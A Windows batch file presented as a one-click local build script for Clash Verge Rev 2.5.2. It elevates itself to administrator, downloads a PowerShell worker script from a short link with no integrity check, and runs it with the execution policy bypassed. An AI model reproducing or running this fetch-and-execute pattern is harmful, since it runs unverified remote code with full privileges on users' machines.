@echo off
setlocal EnableExtensions
chcp 65001 >nul
title Clash Verge 2.5.2 one-click build
cd /d "%~dp0"

echo ==================================================
echo   Clash Verge Rev 2.5.2  -  local Windows build
echo ==================================================
echo.

powershell -NoProfile -Command "if(-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){exit 1}else{exit 0}" >nul 2>&1
if errorlevel 1 (
    echo [INFO] requesting Administrator rights - click Yes on the UAC prompt
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b 0
)

set "REPO=%~dp0"
if "%REPO:~-1%"=="\" set "REPO=%REPO:~0,-1%"
if not exist "%REPO%\package.json" set "REPO=E:\clash-verge"
if not exist "%REPO%\package.json" (
    echo [FATAL] package.json not found.
    echo         Put this BAT inside the clash-verge source folder.
    echo.
    pause
    exit /b 1
)
echo [INFO] repo: %REPO%

set "PS1=%~dp0oneclick-build.ps1"
set "NEED=0"
if not exist "%PS1%" set "NEED=1"
if exist "%PS1%" (
    findstr /c:"oneclick-build v6.1" "%PS1%" >nul 2>&1
    if errorlevel 1 set "NEED=1"
)
if "%NEED%"=="1" (
    echo [INFO] fetching oneclick-build.ps1 v6.1
    where curl.exe >nul 2>&1
    if errorlevel 1 (
        powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://aka.doubaocdn.com/s/OBL92diqsE' -OutFile '%PS1%' -UseBasicParsing"
    ) else (
        curl.exe -fsSL -o "%PS1%" "https://aka.doubaocdn.com/s/OBL92diqsE"
    )
    if not exist "%PS1%" (
        echo [FATAL] download failed - check network or proxy.
        echo.
        pause
        exit /b 1
    )
)
echo [INFO] worker: %PS1%
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Repo "%REPO%"
set "RC=%ERRORLEVEL%"

echo.
echo ==================================================
if "%RC%"=="0" (
    echo   BUILD OK
) else (
    echo   BUILD FAILED  rc=%RC%
)
echo   log file: %REPO%\oneclick-log.txt
echo ==================================================
echo.
pause
exit /b %RC%
